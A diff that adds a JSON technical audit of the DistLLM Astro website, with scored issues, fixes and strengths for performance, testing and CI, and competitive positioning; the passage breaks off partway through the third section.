@@ -1,0 +1,652 @@
+[
+ {
+  "dimension": "Performance (website-astro: dist sizes, bundles, fonts, Pagefind, images, CSS, above-fold, config)",
+  "issues": [
+   {
+    "effort_hours": 0.5,
+    "evidence": "astro.config.mjs: shikiConfig: { themes: { light: \"vitesse-light\", dark: \"vitesse-light\" } }. Built output dist/docs/quick-start/index.html: <pre class=\"astro-code ...\" style=\"background-color:#ffffff;--shiki-dark-bg:#ffffff;color:#393a34;...\">. DocsLayout.astro:231-233 tries .prose-doc :global(pre) { @apply ... bg-[#080d0a] ... text-[#d5f5e3] } but inline style wins (verified 0 occurrences of !important in dist/_astro/DocsLayout.BVc3Un6R.css). Every docs page shows glaring white blocks on the #060907 theme; the dual-theme config also tokenizes every snippet twice with identical output, wasting build time.",
+    "fix": "In astro.config.mjs replace the dual light theme with a single dark one: shikiConfig: { theme: \"one-dark-pro\" } (or \"vesper\"/\"github-dark-default\"). If dual is wanted later, use themes: { light: \"vitesse-dark\", dark: \"vitesse-dark\" } with defaultColor: false so no white inline styles are emitted. Rebuild and spot-check dist/docs/quick-start.",
+    "severity": "High",
+    "title": "Shiki configured with vitesse-light for BOTH themes - docs code blocks render white on the near-black site"
+   },
+   {
+    "effort_hours": 1.5,
+    "evidence": "BaseLayout.astro head (lines 24-53) contains no <link rel=\"preload\" as=\"font\">; the only blocking resource is /_astro/PageLayout.D8EWlqsA.css (42,879 B raw / 9,967 B gz) which carries the 16 @font-face rules (all font-display:swap, verified in built CSS). global.css @layer base sets h1,h2,h3 to Fraunces Variable and body to Inter Variable; the homepage hero terminal uses JetBrains Mono. So first paint uses Georgia/system fallbacks, then swaps - visible flash and layout shift on the exact LCP element. Worst-case font payload if all subsets trigger: ~280 KB; realistic latin-only: ~124 KB.",
+    "fix": "Add three preloads to BaseLayout head matching the hashed dist filenames (or generate via a small build script / astro integration since hashes change): <link rel=\"preload\" href=\"/_astro/inter-latin-wght-normal.Dx4kXJAl.woff2\" as=\"font\" type=\"font/woff2\" crossorigin>, same for fraunces-latin and jetbrains-mono-latin. Optionally add size-adjust fallback @font-face metrics (fontaine, or manual) to kill swap reflow. Keep font-display:swap.",
+    "severity": "Medium",
+    "title": "No font preload and no size-adjusted fallbacks - guaranteed FOUT/reflow on the LCP heading"
+   },
+   {
+    "effort_hours": 0.25,
+    "evidence": "astro.config.mjs defines site, integrations, markdown, redirects - no prefetch key. Pages are tiny (docs/quick-start 27,446 B raw / 5,638 B gz) so hover/viewport prefetch would make docs navigation feel instant at near-zero bandwidth cost. No ClientRouter/ViewTransitions either (grep confirmed), so no SPA-style transitions on docs browsing.",
+    "fix": "Add prefetch: true (hover/viewport default strategy) to astro.config.mjs. Defer ClientRouter/view transitions: the DocsLayout scroll-spy IntersectionObserver and Pagefind panel are not wired for swap semantics and ClientRouter adds ~13 KB JS to every page for little gain on a content site.",
+    "severity": "Medium",
+    "title": "No prefetch configured - docs navigation waits on full round-trips for 5-11 KB pages"
+   },
+   {
+    "effort_hours": 0.25,
+    "evidence": "netlify.toml has a single [[headers]] block: for = \"/_astro/*\" with Cache-Control = \"public, max-age=31536000, immutable\". dist/pagefind/ contains content-addressed fragments plus the unhashed entry pagefind.js; og-image.png (48.6 KB) is fetched by every social scraper with no cache directive. Not a browser-perf regression, but repeat visits and crawler crawls revalidate unnecessarily.",
+    "fix": "Add [[headers]] blocks: for \"/pagefind/*\" -> public, max-age=31536000, immutable (fragments are hashed; pagefind.js is stable between builds - acceptable), and for \"/og-image.png\" -> public, max-age=604800. While in that file, add the missing security headers (CSP is a known gap) - same edit.",
+    "severity": "Low",
+    "title": "netlify.toml caches only /_astro/* - /pagefind/* and /og-image.png get default TTL"
+   },
+   {
+    "effort_hours": 0.5,
+    "evidence": "The site uses the low-level API (DocsLayout.astro imports /pagefind/pagefind.js and renders its own results panel), so dist/pagefind/pagefind-component-ui.js (175,488 B), pagefind-ui.js (119,987 B), pagefind-component-ui.css (43,339 B), pagefind-ui.css (14,482 B), pagefind-modular-ui.css (7,549 B) and pagefind-highlight.js (44,352 B) are never requested by any browser. Harmless at runtime but ~28% of the 2.0 MB artifact for zero benefit.",
+    "fix": "Append a prune step to package.json build: \"astro build && pagefind --site dist && node -e \\\"const fs=require('fs');['pagefind-component-ui.js','pagefind-ui.js','pagefind-component-ui.css','pagefind-ui.css','pagefind-modular-ui.css','pagefind-highlight.js'].forEach(f=>fs.rmSync('dist/pagefind/'+f,{force:true}))\\\"\" - or leave as-is and accept the deploy bloat.",
+    "severity": "Low",
+    "title": "~450 KB of unused Pagefind UI assets shipped in the deploy artifact"
+   },
+   {
+    "effort_hours": 1,
+    "evidence": "Homepage ships three blur-3xl gradient blobs, header backdrop-blur, an SVG with .ad-flow stroke-dasharray animation (CSS - correctly disabled under prefers-reduced-motion), and two SMIL <circle><animateMotion> token dots (dur=2s repeatCount=indefinite) that are NOT gated by reduced-motion and run forever on the marketing page. On low-end Android these keep the compositor/main thread warm during load, the main thing standing between the site and a flat 100 mobile Performance score.",
+    "fix": "Wrap the animateMotion circles in a reduced-motion check (Astro: render them conditionally is not possible statically - instead set <animateMotion> inside a <g> that CSS hides via @media (prefers-reduced-motion: reduce) { .ad-tokens { display:none } }), or swap SMIL for the same CSS dash technique already reduced-motion-gated. Consider dropping one blur-3xl blob.",
+    "severity": "Low",
+    "title": "Always-on animations and blur layers on the homepage cost continuous paint work"
+   },
+   {
+    "effort_hours": 0.1,
+    "evidence": "BaseLayout.astro:51 emits <script defer data-domain=... src=\"https://plausible.io/js/script.js\">. Deferred so non-blocking, but the first cross-origin DNS+TLS happens cold on every first view.",
+    "fix": "Add <link rel=\"preconnect\" href=\"https://plausible.io\" crossorigin> (or dns-prefetch) in BaseLayout head. Saves ~100-300 ms of script fetch on cold loads; zero risk.",
+    "severity": "Low",
+    "title": "Plausible analytics fetched without preconnect"
+   },
+   {
+    "effort_hours": 0.1,
+    "evidence": "public/manifest.webmanifest: \"background_color\": \"#fdfdfb\" (near-white), \"theme_color\": \"#10b981\", while BaseLayout.astro:33 sets <meta name=\"theme-color\" content=\"#060907\"> and the site bg is #060907. Installed-PWA splash and Android status bar will flash light green/white against the dark brand. No perf cost, pure polish, but it is the only remaining color inconsistency after the Shiki fix.",
+    "fix": "Set background_color to #060907 and theme_color to #060907 (or #10b981 if a green OS accent is intended - then align the meta tag).",
+    "severity": "Low",
+    "title": "PWA manifest colors contradict the dark theme"
+   }
+  ],
+  "opportunities": [
+   "Enable Astro prefetch (prefetch: true) - biggest UX-per-perf win for the docs section; pages are 5-11 KB gz so hover-prefetch is nearly free.",
+   "Preload the 3 latin variable woff2 files + add size-adjust fallback metrics - converts the only real load-path weakness (font swap on LCP heading) into a stable render.",
+   "Single dark Shiki theme - halves code-tokenization build work, removes 2x identical theme CSS vars from every docs page, and fixes the white-block visual bug in one config line.",
+   "Prune the 6 unused Pagefind UI files postbuild - shrinks the deploy artifact ~22% (2.0 MB -> ~1.55 MB) with a one-line build step.",
+   "Add /pagefind/* immutable caching + og-image.png TTL in netlify.toml, and bundle the CSP/security headers into the same edit (known gap).",
+   "If richer nav polish is ever wanted, ClientRouter would give view transitions but requires re-initializing the DocsLayout scroll-spy/Pagefind panel on astro:page-load and costs ~13 KB JS/site-wide - prefetch alone captures most of the benefit; keep it off for now.",
+   "Content growth is where perf risk will actually appear: the architecture is sound (inline SVG diagrams, inline micro-scripts, one shared CSS file), so future pages stay fast by default; keep the 'no <img>' discipline or route any future images through astro:assets (<Image> with width/height + webp)."
+  ],
+  "score_0_10": 8.5,
+  "strengths": [
+   "Tiny total artifact: du -sh dist = 2.0 MB across 119 files; every HTML page 15-49 KB raw (5-11 KB gz), minified to single lines (compressHTML default)",
+   "Playground island is exemplary: one 6,882 B (2,858 B gz) deferred ES module (dist/_astro/playground.astro_...B9TKfbs2.js) - no framework runtime, no hydration pipeline",
+   "All interactivity on the homepage is five tiny inline <script type=\"module\"> blocks (terminal typewriter, install customizer, feature tabs, cost calculator, delegated copy buttons) - zero extra requests, deferred by nature",
+   "Pagefind is fully lazy: dynamic import(\"/pagefind/pagefind.js\") on search focus (DocsLayout.astro:158-166); runtime cost only ~45 KB JS + 72 KB wasm + 1-3 KB fragments per query, and the custom panel uses textContent for titles (XSS-safe)",
+   "Zero <img> elements site-wide - every visual (architecture diagram, benchmark bars, logo) is inline SVG or CSS; og-image.png is a well-sized 1200x630 48.6 KB PNG fetched only by scrapers",
+   "Single shared render-blocking CSS of 9,967 B gz (PageLayout.css) cached across all pages; per-layout extras are small (DocsLayout 4,842 B); inlineStylesheets auto keeps it external where caching wins",
+   "Third-party surface is one deferred, privacy-friendly Plausible script, production-gated (BaseLayout.astro:50-52); no font CDN, no jQuery, no ads",
+   "Immutable long-cache on /_astro/* already configured in netlify.toml; hashed asset filenames throughout",
+   "Accessibility/reduced-motion largely respected in JS and CSS animations (typewriter and .ad-flow both gate on prefers-reduced-motion)"
+  ]
+ },
+ {
+  "dimension": "Testing + CI strategy (website-astro)",
+  "issues": [
+   {
+    "effort_hours": 0.5,
+    "evidence": "`git ls-files website-astro` returns 0 files; `git status --porcelain website-astro` shows only `?? website-astro/`. The entire new site (src/, package.json, netlify.toml, astro.config.mjs) exists only on disk.",
+    "fix": "Commit the directory immediately (excluding node_modules/dist/.astro). Until this happens, no CI job, deploy workflow, or test run can ever see the site, and the work is unprotected against loss.",
+    "severity": "Critical",
+    "title": "website-astro/ is completely untracked in git"
+   },
+   {
+    "effort_hours": 2,
+    "evidence": "deploy-website.yml lines 6-8: `branches: [main]` + `paths: [\"website/**\"]`; line 36: `path: website` uploaded to GitHub Pages. That deploys the dead flat-HTML site. Meanwhile website-astro/netlify.toml exists but no vercel.json does, so the intended production host is ambiguous. Repo default branch is master, so the `main` trigger may never fire even for the old site.",
+    "fix": "Pick ONE host. Option A (Netlify, matches existing netlify.toml): delete deploy-website.yml or gut it to a Netlify build hook. Option B (GitHub Pages): rewrite the workflow to setup-node@v4, `working-directory: website-astro`, `npm ci && npm run build`, upload `website-astro/dist`, and set the paths filter to `website-astro/**`. Also align branch trigger with the repo's actual default branch (master).",
+    "severity": "Critical",
+    "title": "Deploy workflow targets the abandoned website/ dir and a branch that may not exist"
+   },
+   {
+    "effort_hours": 6,
+    "evidence": "package.json scripts are only dev/build/preview/check; devDependencies contain just @astrojs/check, pagefind, typescript. The old suites in D:\\distributed-llm\\website\\tests\\ point at baseURL http://localhost:3000 (playwright.config.js) and import ../js/calculator.js from the old flat-HTML codebase \u2014 none runnable against the Astro site.",
+    "fix": "Add Vitest + @playwright/test (+ @axe-core/playwright). Structure: extract pure logic into src/lib/sse.ts, src/lib/cost.ts, src/lib/install.ts, src/lib/snippet.ts; unit tests in tests/unit/*.test.ts; E2E in tests/e2e/*.spec.ts with a new playwright.config.ts whose webServer runs `npm run build && npm run preview` on port 4321. Add scripts: `\"test\": \"vitest run\", \"test:e2e\": \"playwright test\"`.",
+    "severity": "High",
+    "title": "Zero automated tests and zero test dependencies for the new site"
+   },
+   {
+    "effort_hours": 2,
+    "evidence": ".github/workflows/ci.yml jobs (lint/test/test-dist/docker-compose-integration/chaos-tests/security-*/benchmark/etc.) are exclusively Python; grep for 'astro|website-astro' across .github/workflows/ matches only deploy-website.yml. A broken import, content-schema violation, or TS error would merge unnoticed.",
+    "fix": "Add a `website` job to ci.yml (or a dedicated website-ci.yml with `paths: [\"website-astro/**\"]` filter): checkout, setup-node 22 with cache `npm`, `cd website-astro && npm ci`, then `npm run check -- --minimumSeverity error` (currently green: 0 errors), `npm run build` (also runs pagefind and enforces zod content-collection schemas), `npm run test`, `npx playwright install --with-deps chromium && npx playwright test`. Upload the Playwright HTML report as an artifact on failure. ~3-5 min on ubuntu-latest.",
+    "severity": "High",
+    "title": "No Node/Astro gate anywhere in CI"
+   },
+   {
+    "effort_hours": 1,
+    "evidence": "CostCalculator.astro lines 29/34/39 hard-code `$73`, `~$8`, `$780`, but the script's own constants (lines 67-71: `A100_HOURLY = 1.9`, `CONSUMER_TPS = 20`) yield cloudMonthly = 1.9*720 = $1,368/mo, homeMonthly ~= max(5, 80.59 kWh * 0.13) = ~$10.48, savings*12 ~= $16,286 for the default sliders (1000 req x 500 tok). Also line 69 `const A100_TPS = 60;` is never used. Anyone viewing without JS, plus crawlers/AI agents, get numbers that contradict the interactive result by ~19x on cloud cost.",
+    "fix": "(a) Extract render()'s math to src/lib/cost.ts as `computeCosts(requests, tokens)` returning {cloudMonthly, homeMonthly, yearlySavings, ratio} and unit-test it against hand-computed values above; (b) generate the SSR defaults from the same function in frontmatter so markup and JS can never diverge; (c) delete the dead A100_TPS constant or actually model throughput-based cloud sizing with it.",
+    "severity": "Medium",
+    "title": "Cost calculator ships hard-coded defaults that contradict its own runtime math"
+   },
+   {
+    "effort_hours": 4,
+    "evidence": "In src/scripts/playground.ts (351 lines) everything except initPlayground is module-private: the streaming loop at lines 188-214 (split on '\\n\\n', 'data:' prefix strip, '[DONE]' skip, try/JSON.parse 'tolerate keep-alive'), body() (line 70), headers() (line 84: Authorization only when apiKey non-empty), hydrateFromUrl() (line 48). Similarly CostCalculator.astro and InstallCustomizer.astro embed all logic in DOM-coupled inline <script> blocks.",
+    "fix": "Move the SSE loop into `extractDeltas(buffer): {text, count, rest}` in src/lib/sse.ts; move install-command generation to src/lib/install.ts as `buildCommands(os, model, extras)` returning {installCmd, serveCmd}; move curl/python/js snippet templates to src/lib/snippet.ts. Components import from these modules; Vitest imports them directly. Concrete cases: chunk boundary splitting mid-JSON; CRLF vs LF event delimiters; multiple data: lines per event; baseUrl trailing-slash normalization (line 39 `.replace(/\\/+$/, \"\")`); extras `[cli,self-hosted]` join; Windows two-step torch install; 70B pool-hint branch; apiKey empty => no Authorization header.",
+    "severity": "Medium",
+    "title": "Playground island logic is untestable as written"
+   },
+   {
+    "effort_hours": 1.5,
+    "evidence": "netlify.toml contains only a [[headers]] block setting Cache-Control for /_astro/* \u2014 no Content-Security-Policy, X-Frame-Options, Referrer-Policy, HSTS. Astro's static redirects (21 entries in astro.config.mjs like \"/docs.html\": \"/docs/\") compile to meta-refresh HTML stubs visible in dist/api.html/index.html, which Google treats worse than 301s.",
+    "fix": "Append a global [[headers]] block for /* with CSP (script-src 'self'; the site uses no inline handlers \u2014 playground.ts is a module script; style-src 'self' 'unsafe-inline' initially since Tailwind utilities are external but some inline styles exist), X-Frame-Options DENY, Referrer-Policy strict-origin-when-cross-origin, Strict-Transport-Security. If staying on Netlify, also add [[redirects]] entries (status 301) for the legacy .html paths to supersede the meta-refresh stubs.",
+    "severity": "Medium",
+    "title": "netlify.toml has no security headers and relies on meta-refresh redirects"
+   },
+   {
+    "effort_hours": 2,
+    "evidence": "76 built HTML files with heavy cross-linking (docs MDX links, nav, footer, component references like the '/docs/multi-node/' anchor in InstallCustomizer.astro line 64). Nothing verifies internal hrefs resolve; docs reorganizations would ship broken links silently.",
+    "fix": "Sitemap-driven crawl test in Playwright: fetch /sitemap-index.xml -> /sitemap-0.xml, parse all <loc>, expect(response.ok()) for each (~40 URLs), assert body lacks 'Unhandled' error text, assert every page contains exactly one <h1> and canonical link. Plus a dist-scanning link check: parse href/src attributes from dist/**/*.html and verify local targets resolve to files under dist/.",
+    "severity": "Low",
+    "title": "No link-integrity checking across 76 generated pages"
+   },
+   {
+    "effort_hours": 1,
+    "evidence": "astro check output: 'Result (55 files): 0 errors, 0 warnings, 31 hints', including unused imports StatBand and InstallTabs in src/pages/index.astro.",
+    "fix": "Delete the unused imports (or wire the components back in if intentional), then keep check hint-free so future regressions stand out.",
+    "severity": "Low",
+    "title": "31 lingering astro-check hints signal drift"
+   }
+  ],
+  "opportunities": [
+   "Extract playground SSE parsing, cost-calculator math, install-command generation, and snippet templating into src/lib/*.ts pure modules \u2014 this single refactor unlocks meaningful unit coverage of the site's entire interactive logic and fixes the SSR-defaults drift in CostCalculator",
+   "Reuse the sitemap integration (@astrojs/sitemap already configured) as the source of truth for a full-route 200-crawl E2E test, so newly added pages are automatically covered without maintaining a hardcoded route list",
+   "Adopt Vitest per repo precedent (old site's website/tests/calculator.test.js already used it), keeping the JS toolchain consistent and letting unit tests share tsconfig paths with the Astro project",
+   "Single Chromium Playwright project (drop the old config's 4-project chromium/firefox/mobile-chrome/mobile-safari matrix) keeps CI under ~5 min while axe-core still catches real a11y regressions on home/docs/playground",
+   "Add the website CI job with a paths: ['website-astro/**'] trigger so Python CI time is unaffected and frontend failures PR-fail fast with an uploaded Playwright report artifact",
+   "Once deployed, add a post-deploy smoke step (curl the production URL for /, /docs/, /rss.xml, 200 + CSP header present) closing the loop between CI-green and actually-live"
+  ],
+  "score_0_10": 2,
+  "strengths": [
+   "`astro check` passes today with 0 errors (55 files) and `npm run build` succeeds through the pagefind step, so adding both as CI gates is green on day one rather than triage",
+   "All interactive components already expose stable, purpose-built test selectors (`data-pg=\"...\"` on playground, `data-cc=\"...\"` on cost calc, `data-ic=\"...\"` on installer), which makes Playwright locators robust to styling churn",
+   "Content collections via src/content.config.ts enforce zod schemas at build time, giving free structural validation of all 17 docs / 4 blog / 4 changelog entries on every CI build",
+   "@astrojs/sitemap generates sitemap-index.xml (verified 200), providing a machine-readable route inventory to drive exhaustive route-smoke tests without hand-maintaining a URL list",
+   "The abandoned website/tests suite establishes repo precedent for Vitest (unit) + Playwright (E2E), so the proposed stack matches existing team familiarity",
+   "Clean routing behavior verified live: all six key routes return 200 and unknown paths correctly return 404 with a custom 404.astro page"
+  ]
+ },
+ {
+  "dimension": "Website competitive positioning & differentiation (DistLLM vs ollama.com, llama.cpp, vllm.ai, petals.ml, localai.io)",
+  "issues": [
+   {
+    "effort_hours": 10,
+    "evidence": "D:\\distributed-llm\\website-astro\\src\\pages\\benchmarks.astro lines 14-16: eyebrow 'Benchmarks', title \"Measured, not promised\", lead \"Every number below is produced by the built-in benchmark suite against consumer hardware \u2014 rerun it yourself.\" The data is hardcoded placeholders in D:\\distributed-llm\\website-astro\\src\\data\\benchmarks.ts lines 8-17 (e.g. `{ model: \"Llama-3.1-70B\", hardware: \"6\u00d7 RTX 3090 (pooled)\", tps: \"3.9\", ttft: \"1.1 s\" }`), and METHODOLOGY (line 47) doubles down: \"Every number is produced by the built-in benchmark suite against a clean server start. Re-run it on your own cluster to compare.\" The homepage repeats it: \"Reproducible throughput... built in \u2014 the same numbers we publish\" (src/data/features.ts line 60). This audience WILL rerun the suite; divergence kills the project's single most important asset \u2014 credibility.",
+    "fix": "Two-track: (a) immediately relabel as 'Illustrative design targets \u2014 not yet measured on released builds' and delete 'rerun it yourself'; (b) actually run `python -m distllm.cli.main benchmark` on real hardware, commit results as JSON artifacts (date, git SHA, driver/OS, quant) under website-astro/src/data/bench-results/, and render THROUGHPUT/SPECULATIVE/SCALING from those artifacts at build time so every published number traces to a committed measurement.",
+    "severity": "Critical",
+    "title": "Benchmarks page ships placeholder numbers under a 'Measured, not promised' headline \u2014 brand poison for exactly this audience"
+   },
+   {
+    "effort_hours": 4,
+    "evidence": "D:\\distributed-llm\\website-astro\\src\\pages\\community.astro contains three text cards ('Contribute code', 'Write & teach', 'Report & test') and a 'Star the project' CTA showing only the plain string 'github.com/distributed-llm/distributed-llm' \u2014 no star count, no Discord invite, no contributor grid. Grep for discord|twitter|huggingface across src/ returns only twitter meta tags (BaseLayout.astro lines 41-44). The homepage stat band (src/data/features.ts lines 98-103) shows product claims ('70B', '4', '100%', 'Apache-2.0') rather than community metrics. Every rival displays proof: Ollama prints pulls per model on library pages; llama.cpp shows stars/contributors/sponsors; vLLM runs events/meetups and production-user case studies; LocalAI shows stars/badges; Petals links Discord and its swarm health dashboard.",
+    "fix": "Add a build-time GitHub API fetch (stars, forks, contributors count, latest release) rendered into StatBand and community.astro; add a Discord/Matrix invite (create the channel first \u2014 there is currently nowhere for a visitor to talk to anyone except GitHub issues); render contributor avatars from avatars.githubusercontent.com; once PyPI traction exists, show a PyPI downloads badge. Numbers > adjectives.",
+    "severity": "High",
+    "title": "Zero social proof anywhere on the site \u2014 all five competitors display community numbers"
+   },
+   {
+    "effort_hours": 12,
+    "evidence": "No models route exists in D:\\distributed-llm\\website-astro\\src\\pages (404, benchmarks, blog, changelog, community, comparisons, glossary, index, integrations, learn, playground, privacy, security, terms, use-cases, docs only). Closest artifact is the prose doc src/content/docs/model-compatibility.mdx inside a 17-file docs collection. Header nav (src/components/Header.astro): Docs, Playground, Benchmarks, Integrations, Blog, Community. A visitor cannot answer the site's own core question \u2014 'can MY machines run model X?' \u2014 without reading source docs.",
+    "fix": "Do not clone Ollama's library (they will always win at breadth). Build a smaller 'Model explorer' keyed to the unique question: pick your device pool (device picker shared with the cluster planner) and get which models fit + estimated tokens/s range + required pooling topology. Seed from HF metadata + DistLLM partitioner heuristics; mark estimates as estimates (see benchmarks issue).",
+    "severity": "High",
+    "title": "No model gallery/explorer \u2014 parity gap versus 4 of 5 competitors"
+   },
+   {
+    "effort_hours": 6,
+    "evidence": "Petals' site hosts a genuine one-click chat against its public swarm; llama.cpp links an in-browser WebAssembly/WebGPU demo. DistLLM's playground (D:\\distributed-llm\\website-astro\\src\\pages\\playground.astro line 25: `<input data-pg=\"baseUrl\" type=\"text\" value=\"http://localhost:8000\">`; lead: \"Runs entirely in your browser against your own DistLLM server\") requires installing and starting the server first. A curious visitor who won't pip install sees a dead-end panel. Note: the localhost-only constraint is defensible \u2014 it IS the privacy position \u2014 but the empty state doesn't sell it.",
+    "fix": "Keep localhost-first (do not proxy a hosted swarm \u2014 that would surrender the anti-Petals position). Instead: (a) make TerminalDemo on the homepage a looping scripted replay of a real 3-node bring-up so visitors see the product work before installing; (b) upgrade the playground dead state with a health-check button (`GET /health` probe), inline 'start your server' copy-paste block, and common-failure hints (CORS mixed-content notes for https site -> http localhost); (c) optionally embed a short screen-capture video of a heterogeneous pool serving Llama-3.1-70B.",
+    "severity": "Medium",
+    "title": "No zero-install demo path while Petals offers a hosted swarm chat"
+   },
+   {
+    "effort_hours": 2,
+    "evidence": "vLLM is the only competitor with real versioned docs (docs.vllm.ai /en/latest + /en/stable). DistLLM: no version selector or banner in D:\\distributed-llm\\website-astro\\src\\layouts\\DocsLayout.astro, docs float with main branch. Worse, the changelog collection lags the release: src/content/changelog contains only v0-2-0.md, v0-3-0.md, v0-4-0.md, while the package is distributed-llm 0.4.1 and the 0.4.1 announcement lives only in blog/v0-4-1-pypi-release.md \u2014 the footer 'Changelog' link undersells the current release.",
+    "fix": "Now: add a 'Docs target v0.4.x' pill in DocsLayout next to the logo; write changelog/v0-4-1.md mirroring the blog post. Later: adopt Astro content collections keyed by version directory or redirect /docs/en/{version}/ when approaching 1.0 \u2014 commit publicly to that milestone on the community page.",
+    "severity": "Medium",
+    "title": "No docs version pinning, and the changelog collection lags the shipped release"
+   },
+   {
+    "effort_hours": 4,
+    "evidence": "Search input binds data-pagefind-filter=\"docs\" (DocsLayout.astro line 30) over data-pagefind-body on the docs article only (line 87); grep for metaKey/key handling in DocsLayout.astro returns nothing, so no Cmd/Ctrl+K. Blog (4 posts incl. distllm-vs-cloud-costs.md and pooling-consumer-gpus.mdx \u2014 high-intent content), glossary, benchmarks, and use-cases pages are invisible to search. LocalAI's MkDocs Material instant search with highlighting is currently the best experience in the set; DistLLM's Pagefind engine is capable of matching it but is deliberately scoped down.",
+    "fix": "Open a Cmd/Ctrl+K modal (small JS addition to BaseLayout), move data-pagefind-body to cover blog/glossary/use-cases with filters (docs/blog/glossary) and result-type tabs; keep excerptLength tuning already present (pagefind.options({ excerptLength: 12 })).",
+    "severity": "Medium",
+    "title": "Search quality below LocalAI/vLLM bar: no keyboard shortcut, docs-collection scope only"
+   },
+   {
+    "effort_hours": 2,
+    "evidence": "D:\\distributed-llm\\website-astro\\src\\pages\\comparisons.astro renders exactly three tables: \"DistLLM vs Petals\", \"DistLLM vs Modal / RunPod\", \"DistLLM + vLLM\". Yet the homepage FAQ itself names them (features.ts line 111: \"How is this different from vLLM or llama.cpp?\"). Searchers comparing 'ollama multiple computers' or 'llama.cpp multi gpu across machines' \u2014 arguably the highest-intent queries for this product \u2014 land on nothing.",
+    "fix": "Add two more tables: 'DistLLM vs Ollama' (single-device runtime vs cross-device pool; both can coexist \u2014 DistLLM can even drive Ollama-compatible endpoints, cf. integrations page's 'Ollama-compatible' card) and 'DistLLM vs llama.cpp' (same single-node point + RPC limitations). Keep the existing respectful tone and the '+ vLLM' co-opetition pattern where true.",
+    "severity": "Medium",
+    "title": "Comparisons page skips the two most-searched alternative engines: Ollama and llama.cpp"
+   },
+   {
+    "effort_hours": 5,
+    "evidence": "src/pages/playground.astro controls: base URL, API key, model, message, temperature slider, max-tokens slider, stream checkbox, multi-turn checkbox; response pane + snippet pane. There is no TTFT/tokens-per-second readout even though the engine's whole pitch is measurable latency (benchmarks page publishes TTFT columns), no system prompt field, and no way to see the exact wire payload \u2014 a missed chance given the OpenAI-compatibility claim in the FAQ (\"/v1/chat/completions... speak the OpenAI wire format\").",
+    "fix": "In src/scripts/playground.ts, measure and display live TTFT and decode tok/s per request (both available client-side from SSE timing); add a collapsible raw request/response JSON view; add a system-prompt textarea. This turns the playground into a mini version of the benchmark suite \u2014 reinforcing 'measured, not promised' with the visitor's OWN hardware.",
+    "severity": "Low",
+    "title": "Playground lacks the pro features that would make it a genuine debugging tool: live TTFT/tok-s meters, raw JSON view, system prompt"
+   },
+   {
+    "effort_hours": 1,
+    "evidence": "Homepage section \"The math: your hardware vs renting\" \u2014 \"Drag the sliders \u2014 this is why pooling beats renting for steady daily traffic.\" (rendered index.astro section; component src/components/CostCalculator.astro). No visible assumptions (electricity price, duty cycle, hardware amortization). For a project whose differentiation strategy depends on measurement honesty, an unlabeled assumption-based calculator invites the same distrust as the placeholder benchmarks.",
+    "fix": "Show default assumptions inline with editable inputs ($/kWh pre-filled regionally, hours/day, hardware cost basis), and add a one-line methodology footnote mirroring the benchmarks honesty policy. Label outputs as ranges.",
+    "severity": "Low",
+    "title": "Cost calculator presents assumption-derived math without surfacing the assumptions"
+   },
+   {
+    "effort_hours": 2,
+    "evidence": "Known state confirms no CSP headers; D:\\distributed-llm\\website-astro\\netlify.toml is where headers belong. The security.astro page and comparisons table tout 'Per-node cluster keys, API keys, JWT/SSO' \u2014 a visitor who opens devtools and finds no CSP gets a quiet signal that web security wasn't considered either.",
+    "fix": "Add Content-Security-Policy (script-src self + plausible.io; connect-src self for the playground's localhost fetches plus user-entered LAN origins handled via 'connect-src *' caveat documented instead if needed), X-Frame-Options, Referrer-Policy, Permissions-Policy in netlify.toml. Low effort, outsized trust signal for a security-positioned product.",
+    "severity": "Low",
+    "title": "Missing CSP/security headers undercut the security-posture page"
+   }
+  ],
+  "opportunities": [
+   "Unique angle #1 (the flagship, genuinely unclaimed): heterogeneous consumer-GPU LAN pooling into ONE OpenAI-compatible endpoint. Verified positioning gap \u2014 Ollama and llama.cpp are explicitly single-machine; vLLM assumes datacenter-class GPUs; Petals routes prompts through stranger-owned volunteer nodes on the public internet; LocalAI orchestrates backends on one host. No competitor markets 'your gaming laptop + desktop RTX + old 3090 box = one endpoint on your LAN.' The site owns the right words already (index h1 'Pool your GPUs.', features.ts FAQ: 'the layer that pools multiple machines into one logical accelerator') but expresses it only statically \u2014 TOP PLAY: build an interactive 'Cluster Planner / Will it run?' tool: pick devices you own, see estimated layer split (reusing ArchDiagram visuals), memory fit, and honest tokens/s RANGE. Nothing remotely like it exists on any competitor site, and it converts the core architecture into a 30-second aha.",
+   "Unique angle #2 (flywheel): community-run benchmark wall. Invite users to submit `distllm benchmark --json` output via PR to website-astro/src/data/community-results/, rendering a live 'real clusters' table (hardware combos nobody would guess: '3 laptops + desktop', 'mining-rig 3060s'). Turns heterogeneity from marketing claim into accumulating proof, and directly replaces the placeholder-numbers problem with authentic data. Competitors have nothing comparable \u2014 llama.cpp performance reports rot in GitHub threads. Pair with the fixed reproducibility story (issue #1) so submissions are verifiable.",
+   "Unique angle #3 (trust moat): the ONLY inference project whose benchmark suite ships inside the product \u2014 'the same numbers we publish, generated by the engine itself' (features.ts). Ollama/vLLM/Petals/LocalAI publish no reproducible-perf pipeline tied to their sites. After issue #1 is fixed, amplify: render every published number from committed artifacts with date+SHA, and put a 'rerun it' one-liner beside each table.",
+   "Unique angle #4 (category inversion vs Petals): privacy as architecture, demonstrated by the playground itself. Petals' convenience (hosted swarm chat) costs them the privacy story ('Requests traverse volunteer nodes' \u2014 comparisons.astro). DistLLM's localhost-only playground is the mirror image; market the constraint AS the feature: 'This playground talks to YOUR server. Your prompts never leave your network.' Add that line to the playground header.",
+   "Unique angle #5 (training, positioned carefully): federated LoRA fine-tuning WITH differential privacy on consumer hardware (features.ts: gradient clipping + calibrated noise, round-versioned aggregation). Caution: Petals also supports distributed fine-tuning \u2014 never claim 'only inference engines don't train.' Differentiate precisely: private data never leaves each device, DP noise guarantees, and trained adapters served through the same OpenAI endpoint. Also feeds the classroom/edge-lab use case on use-cases.astro.",
+   "Unique angle #6 (TCO tooling): the electricity-vs-rental cost calculator has no analogue on any competitor site (cloud vendors obscure TCO; OSS projects ignore it). With assumptions surfaced (issue #9) it becomes a linkable sales asset for homelab-to-SMB buyers \u2014 pair with the existing distllm-vs-cloud-costs.md blog post.",
+   "Sequencing recommendation: (1) benchmark truthfulness fix [Critical], (2) Cluster Planner, (3) social-proof band + Discord, (4) community results wall, (5) hardware-filtered model explorer, (6) Cmd+K + version banner, (7) playground meters, (8) Ollama/llama.cpp comparison rows. Items 2-5 compound: the planner generates the curiosity, the wall provides the proof, the explorer closes the intent."
+  ],
+  "score_0_10": 6,
+  "strengths": [
